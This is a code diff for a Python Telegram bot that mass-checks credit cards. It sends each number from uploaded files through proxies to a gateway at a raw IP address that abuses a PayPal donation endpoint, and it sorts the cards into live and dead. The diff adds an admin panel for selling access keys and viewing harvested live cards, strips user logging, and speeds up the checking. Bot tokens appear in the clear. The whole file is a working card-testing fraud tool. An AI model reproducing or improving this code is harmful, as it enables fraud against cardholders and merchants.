@@ -6,7 +6,7 @@ import string
 from datetime import datetime, timedelta
 import sys
 
-bot = TeleBot("8663863938:AAGiDOoeBg6lg4B-Zbn0jZm9k7VbLcyQxDQ")
+bot = TeleBot("8663863938:AAHw1s2wTiIdjGndxoJS_iuFBJWZH4n3vvc")
 
 GATEWAY = "http://138.128.240.15:8025/paypal_donate?cc="
 
@@ -50,7 +50,6 @@ def start(m):
         markup = types.InlineKeyboardMarkup()
         markup.add(types.InlineKeyboardButton("🚀 Start Checking", callback_data="start_checking"))
         bot.send_message(m.chat.id, "Let’s check cc send txt file and tap on start checking 🥂", reply_markup=markup)
-        print_log(f"User {user_id} started bot")
     else:
         bot.send_message(m.chat.id, "🔐 **Access Declined**\n\nKey redeem karo: `/redeem <key>`")
 
@@ -67,11 +66,59 @@ def redeem_key(m):
     if key in active_keys and active_keys[key] > datetime.now():
         allowed_users[m.from_user.id] = active_keys[key]
         bot.reply_to(m, f"✅ **Key Accepted!**\nExpiry: {active_keys[key].strftime('%Y-%m-%d')}")
-        print_log(f"User {m.from_user.id} redeemed key")
         del active_keys[key]
     else:
         bot.reply_to(m, "❌ **Invalid or Expired Key**")
 
+@bot.message_handler(commands=['admin'])
+def admin_panel(m):
+    if m.from_user.id != ADMIN_ID:
+        bot.reply_to(m, "❌ Admin only")
+        return
+
+    markup = types.InlineKeyboardMarkup(row_width=2)
+    markup.add(
+        types.InlineKeyboardButton("🔑 30 Days Key", callback_data="gen_key_30"),
+        types.InlineKeyboardButton("🔑 7 Days Key", callback_data="gen_key_7"),
+        types.InlineKeyboardButton("👥 User List", callback_data="user_list"),
+        types.InlineKeyboardButton("💳 Live Cards", callback_data="show_live")
+    )
+    bot.send_message(m.chat.id, "🛠 **Admin Panel**", reply_markup=markup)
+
+@bot.callback_query_handler(func=lambda call: True)
+def admin_callback(call):
+    if call.from_user.id != ADMIN_ID:
+        return
+
+    if call.data == "gen_key_30":
+        key = generate_key()
+        expiry = datetime.now() + timedelta(days=30)
+        active_keys[key] = expiry
+        bot.send_message(call.message.chat.id, f"✅ **30 Days Key**\n`{key}`\nExpiry: {expiry.strftime('%Y-%m-%d')}")
+
+    elif call.data == "gen_key_7":
+        key = generate_key()
+        expiry = datetime.now() + timedelta(days=7)
+        active_keys[key] = expiry
+        bot.send_message(call.message.chat.id, f"✅ **7 Days Key**\n`{key}`\nExpiry: {expiry.strftime('%Y-%m-%d')}")
+
+    elif call.data == "user_list":
+        if not allowed_users:
+            bot.send_message(call.message.chat.id, "Koi active user nahi")
+        else:
+            text = "👥 **Active Users:**\n\n"
+            for uid, exp in allowed_users.items():
+                text += f"ID: `{uid}` | Expiry: {exp.strftime('%Y-%m-%d')}\n"
+            bot.send_message(call.message.chat.id, text)
+
+    elif call.data == "show_live":
+        if not live_cards:
+            bot.send_message(call.message.chat.id, "Koi live card nahi")
+        else:
+            text = "💳 **Live Cards:**\n\n" + "\n".join(live_cards[-30:])
+            bot.send_message(call.message.chat.id, text)
+
+# Mass Check
 @bot.message_handler(content_types=['document'])
 def handle_file(m):
     if not m.document.file_name.endswith('.txt'):
@@ -90,12 +137,12 @@ def handle_file(m):
     live = 0
     dead = 0
 
-    progress_msg = bot.send_message(m.chat.id, "🔄 Starting check...")
+    progress_msg = bot.send_message(m.chat.id, "🔄 Starting fast check...")
 
     markup = types.InlineKeyboardMarkup()
     markup.add(types.InlineKeyboardButton("🛑 Stop", callback_data="stop_check"))
 
-    print_log(f"Mass check started with {len(cards)} cards by user {m.from_user.id}")
+    print_log(f"Fast mass check started with {len(cards)} cards by user {m.from_user.id}")
 
     for i, card in enumerate(cards):
         if stop_flags.get(m.chat.id):
@@ -117,7 +164,7 @@ def handle_file(m):
 
         try:
             url = GATEWAY + card.replace(" ", "")
-            r = requests.get(url, proxies=proxy, timeout=20)
+            r = requests.get(url, proxies=proxy, timeout=15)
             resp = r.text
 
             if any(x in resp.lower() for x in ["charge", "charged", "approved", "success", "live"]):
@@ -133,7 +180,7 @@ def handle_file(m):
             dead += 1
             print_log(f"Error on {card}: {e}")
 
-        time.sleep(1.2)
+        time.sleep(0.8)  # Fast speed
 
     bot.edit_message_text(
         f"✅ **CHECKING COMPLETE**\n\n"
